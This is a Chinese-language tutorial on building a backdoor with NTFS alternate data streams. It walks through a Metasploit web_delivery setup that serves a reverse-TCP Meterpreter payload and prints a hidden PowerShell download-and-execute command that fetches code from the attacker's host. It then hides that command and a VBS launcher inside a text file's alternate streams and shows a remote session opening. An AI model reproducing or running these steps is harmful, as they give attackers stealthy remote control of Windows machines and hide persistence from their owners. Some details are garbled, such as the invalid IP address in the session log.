# ADS 后门


**ADS** (供选数据流/ alternate data stream)
NTFS使用Master File Table (MFT) 来管理文件。windows系统中的每个文件都对应一个MFT记录。而每一个MFT记录由若干个属性(attribute)组成，用来描述该文件的具体信息。比如 $FILE_NAME 属性描述了该文件的文件名和创建修改访问时间，而$DATA属性包含了该文件的具体内容。


##创建后门文件
使用msf的powershell做一个演示：
```bash
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set LHOST 192.168.1.64
LHOST => 192.168.1.64
msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set URIPATH /
URIPATH => /
msf exploit(web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  /                no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)
   LHOST     192.168.1.64  yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH
   msf exploit(web_delivery) > exploit
[*] Exploit running as background job.
msf exploit(web_delivery) >
[*] Started reverse handler on 192.168.1.64:4444
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.1.64:8080/
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.64:8080/'))
```
这样就开启了一个server,只要攻击者执行了
```cmd
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.64:8080'))，我们就可以获得一个meterpreter。
```
##创建ADS后门
测试nc
```cmd
c:\test>type nc.exe > test.txt:nc.exe
 
c:\test>dir /r test.txt
Volume in drive C is OS
Volume Serial Number is F467-BAF0
 
Directory of c:\test
 
2015-07-26  11:19                13 test.txt
38 616 test.txt:nc.exe:$DATA
1 File(s)             13 bytes
0 Dir(s)  42 990 366 720 bytes free
```
可以写入，没有问题。试着执行之
```cmd
c:\test>start test.txt:nc.exe
Access is denied.
```
但是执行不成功。因为从windows xp以后微软就禁止用户从ADS里执行程序了。写入，读出操作都可以，但是不允许执行。既然可以读写那么我们就可以写入脚本然后使用wscript来执行脚本。

创建后门文件：
```cmd
D:\temp>echo powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.64:8080/')) >test.txt:1

D:\temp>echo  Dim objShell:Set objShell = WScript.CreateObject("WScript.Shell"):command = "cmd /C for /f ""delims=,"" %i in (test.txt:1) do %i":objShell.Run command, 0:Set objShell = Nothing >test.txt:2.vbs
```
用wscript.exe运行一下：
```
D:\temp>wscript test.txt:2.vbs
```
再看msf:
```bash
[*] 192.168.1.63  web_delivery - Delivering Payload
[*] Sending stage (885806 bytes) to 192.168.1.63
[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.643:27375) at 2015-07-27 15:03:28 +0800
```